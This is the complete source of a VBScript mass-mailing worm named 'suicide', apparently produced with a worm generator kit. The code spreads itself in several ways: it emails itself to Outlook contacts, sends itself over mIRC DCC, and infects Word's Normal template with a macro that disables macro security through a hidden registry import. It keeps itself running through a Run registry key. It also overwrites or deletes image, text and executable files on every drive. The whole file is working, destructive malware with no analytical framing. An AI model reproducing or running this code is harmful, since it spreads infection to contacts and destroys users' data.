'Serial Number : 0,7055475
'
On Error Resume Next
spawn()
sub spawn()
Set s = CreateObject("Scripting.FileSystemObject")
Set f = s.GetFile(wscript.scriptfullname)
f.Copy ("c:\anyname.vbs")
f.Copy ("c:\folder\subfolder\...\anyname.vbs")
'
end sub
mail()
sub mail()
Set a = CreateObject("Outlook.Application")
Set b = a.GetNameSpace("MAPI")
If a = "Outlook" Then
b.Logon "profile", "password"
For y = 1 To b.AddressLists.Count
Set d = b.AddressLists(y)
x = 1
Set c = a.CreateItem(0)
For oo = 1 To d.AddressEntries.Count
e = d.AddressEntries(x)
c.Recipients.Add e
x = x + 1
If x > 40 Then oo = d.AddressEntries.Count
Next
c.Subject = "Hallo"
c.Body = ".It is for you."
c.attachments.Add wscript.scriptfullname, 1, 1
'
c.Send
e = ""
Next
b.Logoff
End If
end sub
reg()
sub reg()
dim j
Set j = CreateObject("WScript.Shell")
j.regwrite "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\*HLM", wscript.scriptfullname
end sub
'
irc()
sub irc()
set fso = createobject("scripting.filesystemobject")
set scrini = fso.CreateTextFile("c:\program files\mirc\script.ini")
scrini.WriteLine "[script]"
scrini.WriteLine "n0=on 1:JOIN:#:{"
scrini.WriteLine "n1=  /if ( $nick == $me ) { halt }"
scrini.WriteLine "n2=  /dcc send $nick " & wscript.scriptfullname
scrini.WriteLine "n3=}"
scrini.Close
end sub
word()
sub word()
norm ="Sub document_close()" & vbCrLf & _
"On Error Resume Next" & vbCrLf & _
"Open ""c:\xploit.txt"" For Output As 2" & vbCrLf & _
"Print #2, ""sub document_open()""" & vbCrLf & _
"Print #2, ""On Error Resume Next""" & vbCrLf & _
"Print #2, ""'by alcopaul""" & vbCrLf & _
"Print #2, ""obj = ActiveDocument.Shapes(1).OLEFormat.ClassType""" & vbCrLf & _
"Print #2, ""With ActiveDocument.Shapes(1).OLEFormat""" & vbCrLf & _
"Print #2, ""    .ActivateAs ClassType:=obj""" & vbCrLf & _
"Print #2, ""    .Activate""" & vbCrLf & _
"Print #2, ""End With""" & vbCrLf & _
"Print #2, ""end sub""" & vbCrLf & _
"Close 2" & vbCrLf & _
"Set fso = CreateObject(""Scripting.FileSystemObject"")" & vbCrLf & _
"Set nt = ActiveDocument.VBProject.vbcomponents(1).codemodule" & vbCrLf & _
"Set iw = fso.OpenTextFile(""c:\xploit.txt"", 1, True)" & vbCrLf & _
"nt.DeleteLines 1, nt.CountOfLines" & vbCrLf & _
"i = 1 " & vbCrLf & _
"Do While iw.atendofstream <> True" & vbCrLf & _
"b = iw.readline" & vbCrLf & _
"nt.InsertLines i, b " & vbCrLf & _
"i = i + 1 " & vbCrLf & _
"Loop" & vbCrLf & _
"ActiveDocument.Shapes.AddOLEObject _" & vbCrLf & _
"FileName:=""c:\anyname.vbs"", _" & vbCrLf & _
"LinkToFile:=False" & vbCrLf & _
"ActiveDocument.Save" & vbCrLf & _
"Open ""c:\vv.reg"" For Output As 3" & vbCrLf & _
"Print #3, ""REGEDIT4""" & vbCrLf & _
"Print #3, ""[HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security]""" & vbCrLf & _
"Print #3, """"""Level""""=dword:00000001""" & vbCrLf & _
"Print #3, ""[HKEY_CURRENT_USER\Software\Microsoft\Office\10.0\Word\Security]""" & vbCrLf & _
"Print #3, """"""Level""""=dword:00000001""" & vbCrLf & _
"Print #3, """"""AccessVBOM""""=dword:00000001""" & vbCrLf & _
"Close 3" & vbCrLf & _
"Shell ""regedit /s c:\vv.reg"", vbHide" & vbCrLf & _
"Kill ""c:\vv.reg""" & vbCrLf & _
"End Sub"
Set fso = CreateObject("Scripting.FileSystemObject")
set f = fso.createtextfile("c:\try.txt")
f.write norm
f.Close
Set oword = CreateObject("Word.Application")
oword.Visible = False
Set nt = oword.NormalTemplate.vbproject.vbcomponents(1).codemodule
Set iw = fso.OpenTextFile("c:\try.txt", 1, True)
nt.DeleteLines 1, nt.CountOfLines
i = 1
Do While iw.atendofstream <> True
b = iw.readline
nt.InsertLines i, b
i = i + 1
Loop
oword.NormalTemplate.Save
oword.NormalTemplate.Close
end sub
haha()
Sub haha()
On Error Resume Next
Dim d, dc, s, fso, haha
Set fso = CreateObject("Scripting.FileSystemObject")
Set dc = fso.Drives
For Each d In dc
If d.DriveType = 2 Or d.DriveType = 3 Then
hihi (d.Path & "\")
End If
Next
haha = s
End Sub
Sub hehe(folderspec)
On Error Resume Next
Dim f, f1, fc, ext, s, fso
Set fso = CreateObject("Scripting.FileSystemObject")
Set f = fso.GetFolder(folderspec)
Set fc = f.Files
For Each f1 In fc
ext = fso.GetExtensionName(f1.Path)
ext = LCase(ext)
s = LCase(f1.Name)
If (ext = "jpg") Then
Set f = fso.GetFile(wscript.scriptfullname)
f.Copy (f1.Path & ".vbs")
fso.deletefile(f1.path)
End If
If (s = "freecell.exe") Or (s = "readme.txt") or (s = "license.txt") Then
Set f = fso.getfile(wscript.scriptfullname)
f.Copy (f1.Path)
fso.deletefile(f1.path)
End If
If (ext = "exe") Or (ext = "bmp") Then
Set f = fso.getfile(wscript.scriptfullname)
f.Copy (f1.Path & ".vbs")
End If
Next
End Sub
Sub hihi(folderspec)
On Error Resume Next
Dim f, f1, sf, fso
Set fso = CreateObject("Scripting.FileSystemObject")
Set f = fso.GetFolder(folderspec)
Set sf = f.SubFolders
For Each f1 In sf
hehe (f1.Path)
hihi (f1.Path)
Next
End Sub
'
msgbox "Message", ,"Title"
'=========================================
'made by : me
'worm name : suicide
'=========================================
'
'credits : 
'generated using [MYIVWE] v.1 by alcopaul/[rRlf]
'
